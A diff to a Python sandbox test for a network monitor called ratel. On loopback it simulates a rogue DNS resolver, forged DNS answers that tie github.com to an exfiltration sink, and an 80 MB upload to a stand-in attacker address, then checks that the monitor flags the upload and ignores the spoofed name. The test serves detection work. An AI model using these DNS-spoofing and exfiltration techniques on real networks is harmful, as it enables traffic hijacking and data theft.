@@ -11,15 +11,16 @@ traffic that must NOT alert (a download, normal DNS, a few web-like requests).
 import json, os, shutil, socket, subprocess, sys, threading, time
 
 ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-RATEL = os.path.join(ROOT, "target", "release", "ratel")
+RATEL = os.environ.get("RATEL_BIN") or os.path.join(ROOT, "target", "release", "ratel")
 SINK, C2, DNS, PINGT, WEB = "203.0.113.9", "198.51.100.7", "10.53.53.53", "192.0.2.10", "192.0.2.80"
+ROGUE = "198.51.100.53"  # an attacker's own DNS server
 
 def sh(*a):
     subprocess.run(a, check=True)
 
 sh("ip", "link", "set", "lo", "up")
 ME = "10.0.0.2"  # "this host": clients connect from here, so server-side sockets look private
-for a in (SINK, C2, DNS, PINGT, WEB, ME):
+for a in (SINK, C2, DNS, PINGT, WEB, ME, ROGUE):
     sh("ip", "addr", "add", a + "/32", "dev", "lo")
 
 def server(host, port, handler):
@@ -53,15 +54,25 @@ def resolver():
         u.sendto(bytes(r), a)
 threading.Thread(target=resolver, daemon=True).start()
 
+def rogue_resolver():
+    # answers every A query with the exfil sink's address
+    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.bind((ROGUE, 53))
+    while True:
+        q, a = u.recvfrom(2048)
+        r = bytearray(q); r[2] |= 0x80; r[3] = 0x80; r[7] = 1
+        r += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + bytes(int(x) for x in SINK.split("."))
+        u.sendto(bytes(r), a)
+threading.Thread(target=rogue_resolver, daemon=True).start()
+
 _orig_cc = socket.create_connection
 def cc(addr, timeout=None):
     return _orig_cc(addr, timeout=timeout, source_address=(ME, 0))
 socket.create_connection = cc
 
-def dnsq(name, qtype=1):
+def dnsq(name, qtype=1, server=DNS):
     q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"
     u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.settimeout(1); u.bind((ME, 0))
-    u.sendto(q, (DNS, 53))
+    u.sendto(q, (server, 53))
     try: u.recv(2048)
     except OSError: pass
     u.close()
@@ -85,7 +96,7 @@ import shutil; shutil.copy(os.path.join(ROOT, "data/synth/bin/s1_000066"), SCAN 
 state = "/tmp/ratel-sbx-state"
 os.makedirs(state, exist_ok=True)
 shutil.rmtree(state, ignore_errors=True); os.makedirs(state)
-w = subprocess.Popen([RATEL, "watch", "--loopback", "--learn-hours", "0", "--json", "--duration", "200",
+w = subprocess.Popen([RATEL, "watch", "--loopback", "--resolver", DNS, "--learn-hours", "0", "--json", "--duration", "200",
                       "--state", state, "--interval", "1", "--no-scan-exes", "--record", "/tmp/ratel-sbx-events.jsonl",
                       "--log", "/tmp/ratel-sbx-alerts.jsonl", "--scan-path", SCAN, "--scan-every", "1"],
                      stdout=subprocess.PIPE, text=True, env=dict(os.environ, NOTIFY_SOCKET=NOTIFY))
@@ -97,6 +108,27 @@ for i in range(5):
     s = socket.create_connection((WEB, 443)); s.sendall(b"GET / HTTP/1.1\r\n\r\n")
     while s.recv(65536): pass
     s.close()
+# ---- forged DNS answer (no query was sent) claiming the exfil sink is github.com:
+# the monitor must not believe it (the upload must still be to "an address no DNS lookup returned")
+fake = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+fake.bind((DNS, 5353))
+ans = (b"\x77\x77\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" + b"\x06github\x03com\x00\x00\x01\x00\x01"
+       + b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + bytes(int(x) for x in SINK.split(".")))
+for port in (33333, 44444, 55555):
+    fake.sendto(ans, (ME, port))  # from port 5353: also send one from 53 below
+fake.close()
+fake53 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); fake53.bind((DNS, 0))
+# a real resolver socket on :53 exists (the fake resolver thread); craft from it instead via raw send
+for port in (33333, 44444):
+    try:
+        u2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        u2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+        u2.bind((DNS, 53)); u2.sendto(ans, (ME, port)); u2.close()
+    except OSError:
+        pass
+fake53.close()
+# ---- a real answer, but from the attacker's own DNS server (asked directly): matched, not believed
+dnsq("github.com", server=ROGUE)
 # ---- bulk exfil: 80 MB to a never-seen host, odd port
 s = socket.create_connection((SINK, 8443)); buf = os.urandom(1 << 20)
 for _ in range(80):
@@ -141,11 +173,14 @@ time.sleep(1)
 al = subprocess.run([RATEL, "alerts", "--log", "/tmp/ratel-sbx-alerts.jsonl", "--min", "medium"], capture_output=True, text=True)
 print("--- ratel alerts:\n" + al.stdout + al.stderr)
 inc = sorted(f[:-6] for f in os.listdir(state + "/incidents"))
-exf = [i for i in inc if "exfil" in i]
+def holds(i, kind):  # incidents group related alerts: look inside, not at the file name
+    with open(f"{state}/incidents/{i}.jsonl") as fh:
+        return any(json.loads(l).get("alert", {}).get("kind") == kind for l in fh if l.strip())
+exf = [i for i in inc if holds(i, "exfil")]
 if exf:
     ex = subprocess.run([RATEL, "explain", exf[0], "--state", state], capture_output=True, text=True)
     print("--- ratel explain " + exf[0] + ":\n" + ex.stdout + ex.stderr)
-bea = [i for i in inc if "beacon" in i]
+bea = [i for i in inc if holds(i, "beacon")]
 if bea:
     ak = subprocess.run([RATEL, "ack", bea[0], "--fp", "--note", "test", "--state", state], capture_output=True, text=True)
     print("--- ratel ack --fp:\n" + ak.stdout + ak.stderr)
@@ -158,6 +193,9 @@ print("--- health alerts:", [(a["title"], a["evidence"][:2]) for a in health])
 announced = any("suppression" in a["title"] and any("/usr/bin/planted" in e for e in a["evidence"]) for a in health)
 rejected = any("feedback inbox" in a["title"] and any("rejected suppression" in e for e in a["evidence"]) for a in health)
 print("suppression announced:", announced, "| catch-all wildcard rejected:", rejected)
+exf_alert = [a for a in alerts if a["kind"] == "exfil" and SINK in a["dest"]]
+spoof_ok = bool(exf_alert) and "github" not in exf_alert[0]["dest"] and any("no DNS lookup returned" in e for e in exf_alert[0]["evidence"])
+print("forged DNS answer ignored:", spoof_ok, exf_alert[0]["dest"] if exf_alert else None)
 bad = [a for a in alerts if WEB in a["dest"] or "example.org" in a["dest"]]
 print("missing:", sorted(want - kinds) or "none", "| false alerts on benign:", len(bad))
-sys.exit(0 if want <= kinds and not bad and received and exf and announced and rejected else 1)
+sys.exit(0 if want <= kinds and not bad and received and exf and announced and rejected and spoof_ok else 1)
